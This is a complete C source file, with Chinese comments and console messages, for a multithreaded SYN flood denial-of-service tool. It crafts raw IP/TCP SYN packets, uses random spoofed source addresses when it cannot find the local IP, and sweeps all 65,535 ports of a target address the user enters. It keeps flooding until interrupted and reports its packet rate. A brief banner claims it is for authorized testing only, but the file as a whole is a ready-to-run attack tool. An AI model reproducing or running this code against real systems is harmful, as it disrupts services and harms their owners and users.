#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <locale.h>
#include <stdint.h>

#define MAX_PORTS 65535
#define THREAD_COUNT 8
#define PACKET_SIZE 1024

// 定义IP头（Linux/MacOS可能已经定义，但我们重新定义以确保兼容性）
typedef struct ip_header {
    unsigned char  ihl:4, ver:4;
    unsigned char  tos;
    unsigned short total_length;
    unsigned short id;
    unsigned short frag_off;
    unsigned char  ttl;
    unsigned char  protocol;
    unsigned short checksum;
    unsigned int   saddr;
    unsigned int   daddr;
} IP_HEADER;

// 定义TCP头
typedef struct tcp_header {
    unsigned short sport;
    unsigned short dport;
    unsigned int   seq;
    unsigned int   ack;
    unsigned char  data_offset;
    unsigned char  flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urg_ptr;
} TCP_HEADER;

// 伪头部用于校验和
typedef struct pseudo_header {
    unsigned int saddr;
    unsigned int daddr;
    unsigned char zero;
    unsigned char protocol;
    unsigned short tcp_length;
} PSEUDO_HEADER;

// 全局变量
int raw_sock = -1;
struct sockaddr_in dest_addr;
volatile int attack_active = 1;
volatile long packets_sent = 0;
time_t start_time;
unsigned int local_ip = 0;
char target_ip_str[16] = {0};

// 设置控制台编码为UTF-8
void set_console_encoding() {
    setlocale(LC_ALL, "en_US.UTF-8");
}

// 计算校验和
unsigned short calculate_checksum(unsigned short *buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size) {
        cksum += *(unsigned char*)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (unsigned short)(~cksum);
}

// 获取本地IP地址
unsigned int get_local_ip(const char* target_ip) {
    int temp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (temp_sock < 0) {
        printf("创建临时套接字失败: %s\n", strerror(errno));
        return INADDR_NONE;
    }
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    if (inet_pton(AF_INET, target_ip, &target.sin_addr) <= 0) {
        close(temp_sock);
        return INADDR_NONE;
    }
    target.sin_port = htons(80);
    
    if (connect(temp_sock, (struct sockaddr*)&target, sizeof(target)) < 0) {
        printf("连接测试失败: %s\n", strerror(errno));
        close(temp_sock);
        return INADDR_NONE;
    }
    
    struct sockaddr_in local;
    socklen_t addr_len = sizeof(local);
    if (getsockname(temp_sock, (struct sockaddr*)&local, &addr_len) < 0) {
        printf("获取本地地址失败: %s\n", strerror(errno));
        close(temp_sock);
        return INADDR_NONE;
    }
    
    unsigned int result = local.sin_addr.s_addr;
    close(temp_sock);
    return result;
}

// 发送SYN包到指定端口
void send_syn_to_port(int port) {
    char packet[sizeof(IP_HEADER) + sizeof(TCP_HEADER)];
    memset(packet, 0, sizeof(packet));
    
    // 填充IP头
    IP_HEADER *iph = (IP_HEADER *)packet;
    iph->ver = 4;
    iph->ihl = sizeof(IP_HEADER) / 4;
    iph->tos = 0;
    iph->total_length = htons(sizeof(packet));
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 128;
    iph->protocol = IPPROTO_TCP;
    
    if (local_ip == INADDR_NONE) {
        iph->saddr = htonl(rand() % 0xFFFFFFFF);
    } else {
        iph->saddr = local_ip;
    }
    
    iph->daddr = dest_addr.sin_addr.s_addr;
    iph->checksum = 0;
    iph->checksum = calculate_checksum((unsigned short *)iph, sizeof(IP_HEADER));
    
    // 填充TCP头
    TCP_HEADER *tcph = (TCP_HEADER *)(packet + sizeof(IP_HEADER));
    tcph->sport = htons(rand() % 16383 + 49152); // 49152-65535动态端口
    tcph->dport = htons(port);
    tcph->seq = htonl(rand());
    tcph->ack = 0;
    tcph->data_offset = (sizeof(TCP_HEADER) / 4) << 4;
    tcph->flags = 0x02; // SYN标志
    tcph->window = htons(64240);
    tcph->urg_ptr = 0;
    tcph->checksum = 0;
    
    // 伪头部用于校验和计算
    PSEUDO_HEADER psh;
    psh.saddr = iph->saddr;
    psh.daddr = iph->daddr;
    psh.zero = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(TCP_HEADER));
    
    char *pseudo_packet = (char *)malloc(sizeof(PSEUDO_HEADER) + sizeof(TCP_HEADER));
    if (!pseudo_packet) return;
    
    memcpy(pseudo_packet, &psh, sizeof(PSEUDO_HEADER));
    memcpy(pseudo_packet + sizeof(PSEUDO_HEADER), tcph, sizeof(TCP_HEADER));
    tcph->checksum = calculate_checksum((unsigned short *)pseudo_packet, 
                                       sizeof(PSEUDO_HEADER) + sizeof(TCP_HEADER));
    free(pseudo_packet);
    
    // 发送数据包
    sendto(raw_sock, packet, sizeof(packet), 0, 
           (struct sockaddr *)&dest_addr, sizeof(dest_addr));
}

// 攻击线程函数
void* attack_thread(void *param) {
    int thread_id = (int)(long)param;
    int port = 1;
    
    while (attack_active) {
        for (port = 1 + thread_id; port <= MAX_PORTS; port += THREAD_COUNT) {
            if (!attack_active) break;
            send_syn_to_port(port);
            __sync_fetch_and_add(&packets_sent, 1);
            
            // 每1000个包休息1ms防止CPU过载
            if (packets_sent % 1000 == 0) {
                usleep(1000);
            }
        }
    }
    return NULL;
}

// 显示统计信息
void* show_stats(void *param) {
    while (attack_active) {
        double elapsed = (double)(time(NULL) - start_time);
        double pps = (elapsed > 0.1) ? (packets_sent / elapsed) : 0;
        
        printf("\r攻击中 | 目标: %s | 发送: %ld 包 | 速率: %.1f pps | 持续时间: %.1f 秒",
               inet_ntoa(dest_addr.sin_addr), packets_sent, pps, elapsed);
        fflush(stdout);
        
        sleep(1);
    }
    return NULL;
}

// 显示法律声明
void show_disclaimer() {
    printf("=====================================================\n");
    printf("             SYN洪水攻击工具 (全端口遍历)             \n");
    printf("=====================================================\n");
    printf("法律声明: 本工具仅用于授权安全测试\n");
    printf("          禁止用于非法攻击活动\n");
    printf("          使用者需对自身行为负全部法律责任\n");
    printf("          仅限测试自有服务器或获得明确授权的系统\n");
    printf("=====================================================\n\n");
}

// 检查root权限
int is_root() {
    return geteuid() == 0;
}

// 信号处理函数
void signal_handler(int sig) {
    if (sig == SIGINT) {
        printf("\n接收到中断信号，停止攻击...\n");
        attack_active = 0;
    }
}

// 获取用户输入的目标IP地址
void get_target_ip() {
    printf("\n请输入目标IP地址 (例如: 192.168.1.100): ");
    
    if (fgets(target_ip_str, sizeof(target_ip_str), stdin) == NULL) {
        printf("读取输入失败!\n");
        exit(1);
    }
    
    // 移除换行符
    target_ip_str[strcspn(target_ip_str, "\n")] = 0;
    
    // 验证IP地址格式
    struct in_addr addr;
    if (inet_pton(AF_INET, target_ip_str, &addr) <= 0) {
        printf("错误: 无效的IP地址格式!\n");
        printf("请按以下格式输入: XXX.XXX.XXX.XXX\n");
        get_target_ip(); // 递归调用直到输入有效
    }
}

int main() {
    // 设置控制台编码
    set_console_encoding();
    
    // 设置信号处理
    signal(SIGINT, signal_handler);
    
    // 显示法律声明
    show_disclaimer();
    
    // 检查root权限
    if (!is_root()) {
        printf("错误: 需要root权限运行此程序!\n");
        printf("请使用以下命令运行:\n");
        printf("sudo %s\n", "./syn_flood");
        return 1;
    }
    
    // 获取目标IP地址
    get_target_ip();
    
    // 获取本地IP地址
    printf("正在确定本地IP地址...\n");
    local_ip = get_local_ip(target_ip_str);
    if (local_ip == INADDR_NONE) {
        printf("警告: 无法确定本地IP，将使用随机源IP\n");
    } else {
        struct in_addr addr;
        addr.s_addr = local_ip;
        printf("使用本地IP: %s\n", inet_ntoa(addr));
    }
    
    // 创建原始套接字
    printf("正在创建原始套接字...\n");
    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) {
        printf("创建原始套接字失败: %s\n", strerror(errno));
        printf("请确认以root权限运行此程序\n");
        return 1;
    }
    
    // 设置IP头包含选项
    int hincl = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl)) < 0) {
        printf("设置IP_HDRINCL失败: %s\n", strerror(errno));
        close(raw_sock);
        return 1;
    }
    
    // 设置目标地址
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, target_ip_str, &dest_addr.sin_addr) <= 0) {
        printf("无效的目标IP地址: %s\n", target_ip_str);
        close(raw_sock);
        return 1;
    }
    
    // 初始化随机数生成器
    srand((unsigned int)time(NULL));
    
    printf("\n启动对 %s 的SYN洪水攻击...\n", target_ip_str);
    printf("攻击端口范围: 1-%d\n", MAX_PORTS);
    printf("使用线程数: %d\n", THREAD_COUNT);
    printf("按Ctrl+C停止攻击\n\n");
    
    start_time = time(NULL);
    
    // 创建攻击线程
    pthread_t threads[THREAD_COUNT];
    pthread_t stats_thread;
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, (void *)(long)i) != 0) {
            printf("创建线程 %d 失败: %s\n", i, strerror(errno));
            attack_active = 0;
        }
    }
    
    // 创建统计线程
    if (pthread_create(&stats_thread, NULL, show_stats, NULL) != 0) {
        printf("创建统计线程失败: %s\n", strerror(errno));
    }
    
    // 等待攻击线程结束
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // 停止统计线程
    attack_active = 0;
    pthread_join(stats_thread, NULL);
    
    // 计算最终统计
    double total_time = (double)(time(NULL) - start_time);
    double avg_pps = (total_time > 0.1) ? (packets_sent / total_time) : 0;
    
    printf("\n\n攻击已停止!\n");
    printf("总攻击时间: %.1f 秒\n", total_time);
    printf("发送数据包总数: %ld\n", packets_sent);
    printf("平均攻击速率: %.1f 包/秒\n", avg_pps);
    printf("攻击端口范围: 1-%d\n", MAX_PORTS);
    
    // 清理资源
    if (raw_sock >= 0) {
        close(raw_sock);
    }
    
    return 0;
}